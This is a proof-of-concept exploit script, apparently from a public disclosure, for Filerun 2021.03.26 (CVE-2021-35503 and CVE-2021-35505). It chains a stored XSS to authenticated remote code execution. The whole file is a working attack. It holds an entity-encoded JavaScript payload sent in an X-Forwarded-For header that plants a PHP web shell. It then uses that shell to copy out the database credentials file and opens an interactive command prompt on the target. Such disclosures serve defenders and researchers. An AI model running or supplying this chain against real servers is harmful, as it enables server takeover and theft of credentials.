# Exploit Title: Multiple Vulnerabilities in Filerun 2021.03.26
# Google Dork:
# Date: 09/21/2021
# Exploit Author: syntegris information solutions GmbH
# Credits: Christian P.
# Vendor Homepage: https://filerun.com
# Software Link: https://f.afian.se/wl/?id=SkPwYC8dOcMIDWohmyjOqAgdqhRqCZ3X&fmode=download&recipient=d3d3LmZpbGVydW4uY29t
# Version: 2021.03.26
# Tested on: official docker image
# CVE: CVE-2021-35503 and CVE-2021-35505


# PoC for exploiting a chain of a stored XSS and authenticated Remote Code Execution
import requests
import time
import sys

# this is the plain version of the payload below
"""
var xmlhttp = new XMLHttpRequest();
var url = '/?module=cpanel&section=settings&page=image_preview&action=checkImageMagick'
var payload = "echo '<?php echo shell_exec($_REQUEST[\'cmd\']); ?>'  > shell.php #";
xmlhttp.onreadystatechange = function() {
	if (xmlhttp.readyState == XMLHttpRequest.DONE) {
	   if (xmlhttp.status == 200) {
		   console.log(xmlhttp.responseText);
	   }
	}
};
xmlhttp.open("POST", url, true);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send("mode=exec&path=convert|"+payload);
"""

if not len(sys.argv) == 2:
	print("missing target url")
	sys.exit(1)

target = sys.argv[1]


def inject_code():
	payload = "&#x76;&#x61;&#x72;&#x20;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x2f;&#x3f;&#x6d;&#x6f;&#x64;&#x75;&#x6c;&#x65;&#x3d;&#x63;&#x70;&#x61;&#x6e;&#x65;&#x6c;&#x26;&#x73;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x73;&#x65;&#x74;&#x74;&#x69;&#x6e;&#x67;&#x73;&#x26;&#x70;&#x61;&#x67;&#x65;&#x3d;&#x69;&#x6d;&#x61;&#x67;&#x65;&#x5f;&#x70;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x26;&#x61;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x63;&#x68;&#x65;&#x63;&#x6b;&#x49;&#x6d;&#x61;&#x67;&#x65;&#x4d;&#x61;&#x67;&#x69;&#x63;&#x6b;&#x27;&#x0a;&#x76;&#x61;&#x72;&#x20;&#x70;&#x61;&#x79;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x3d;&#x20;&#x22;&#x65;&#x63;&#x68;&#x6f;&#x20;&#x27;&#x3c;&#x3f;&#x70;&#x68;&#x70;&#x20;&#x65;&#x63;&#x68;&#x6f;&#x20;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x5f;&#x65;&#x78;&#x65;&#x63;&#x28;&#x24;&#x5f;&#x52;&#x45;&#x51;&#x55;&#x45;&#x53;&#x54;&#x5b;&#x5c;&#x27;&#x63;&#x6d;&#x64;&#x5c;&#x27;&#x5d;&#x29;&#x3b;&#x20;&#x3f;&#x3e;&#x27;&#x20;&#x20;&#x3e;&#x20;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x2e;&#x70;&#x68;&#x70;&#x20;&#x23;&#x22;&#x3b;&#x0a;&#x0a;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x6f;&#x6e;&#x72;&#x65;&#x61;&#x64;&#x79;&#x73;&#x74;&#x61;&#x74;&#x65;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x20;&#x3d;&#x20;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x20;&#x7b;&#x0a;&#x09;&#x69;&#x66;&#x20;&#x28;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x79;&#x53;&#x74;&#x61;&#x74;&#x65;&#x20;&#x3d;&#x3d;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x44;&#x4f;&#x4e;&#x45;&#x29;&#x20;&#x7b;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x74;&#x61;&#x74;&#x75;&#x73;&#x20;&#x3d;&#x3d;&#x20;&#x32;&#x30;&#x30;&#x29;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x20;&#x20;&#x20;&#x63;&#x6f;&#x6e;&#x73;&#x6f;&#x6c;&#x65;&#x2e;&#x6c;&#x6f;&#x67;&#x28;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x72;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x65;&#x6c;&#x73;&#x65;&#x20;&#x69;&#x66;&#x20;&#x28;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x74;&#x61;&#x74;&#x75;&#x73;&#x20;&#x3d;&#x3d;&#x20;&#x34;&#x30;&#x30;&#x29;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x20;&#x20;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x54;&#x68;&#x65;&#x72;&#x65;&#x20;&#x77;&#x61;&#x73;&#x20;&#x61;&#x6e;&#x20;&#x65;&#x72;&#x72;&#x6f;&#x72;&#x20;&#x34;&#x30;&#x30;&#x27;&#x29;&#x3b;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x65;&#x6c;&#x73;&#x65;&#x20;&#x7b;&#x0a;&#x09;&#x09;&#x20;&#x20;&#x20;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x73;&#x6f;&#x6d;&#x65;&#x74;&#x68;&#x69;&#x6e;&#x67;&#x20;&#x65;&#x6c;&#x73;&#x65;&#x20;&#x6f;&#x74;&#x68;&#x65;&#x72;&#x20;&#x74;&#x68;&#x61;&#x6e;&#x20;&#x32;&#x30;&#x30;&#x20;&#x77;&#x61;&#x73;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x65;&#x64;&#x27;&#x29;&#x3b;&#x0a;&#x09;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x09;&#x7d;&#x0a;&#x7d;&#x3b;&#x0a;&#x0a;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x20;&#x75;&#x72;&#x6c;&#x2c;&#x20;&#x74;&#x72;&#x75;&#x65;&#x29;&#x3b;&#x0a;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x54;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x20;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x6d;&#x6c;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x22;&#x6d;&#x6f;&#x64;&#x65;&#x3d;&#x65;&#x78;&#x65;&#x63;&#x26;&#x70;&#x61;&#x74;&#x68;&#x3d;&#x63;&#x6f;&#x6e;&#x76;&#x65;&#x72;&#x74;&#x7c;&#x22;&#x2b;&#x70;&#x61;&#x79;&#x6c;&#x6f;&#x61;&#x64;&#x29;&#x3b;&#x0a;"
	req = requests.post(
		"%s/?module=fileman&page=login&action=login" % target,
		data={'username': 'nonexistend', 'password': 'wrong', 'otp':'',
		'two_step_secret':'','language':''}, headers={'X-Forwarded-For': '<img src="/asdasdasd" onerror=%s >' % payload}
	)


def check_shell_exists():
	req = requests.get("%s/shell.php" % target)
	if req.status_code != 200:
		return False
	return True

def process_command(command):
	req = requests.get("%s/shell.php?cmd=%s" % (target, command))
	print(req.text)

while True:
	print("Injecting new log message...")
	inject_code()
	time.sleep(10)
	if check_shell_exists():
		print("Shell exists under '%s/shell.php?cmd=ls'" % target)
		break
print("Lets get autoconfig.php which contains database credentials...")
process_command("cp system/data/autoconfig.php js/autoconfig.txt")

ac_resp = requests.get("%s/js/autoconfig.txt" % target)
with open("filerun.autoconfig.php", "wb") as ac_f:
	ac_f.write(ac_resp.content)
process_command("rm js/autoconfig.php")

while True:
	command = input("Command:")
	process_command(command)
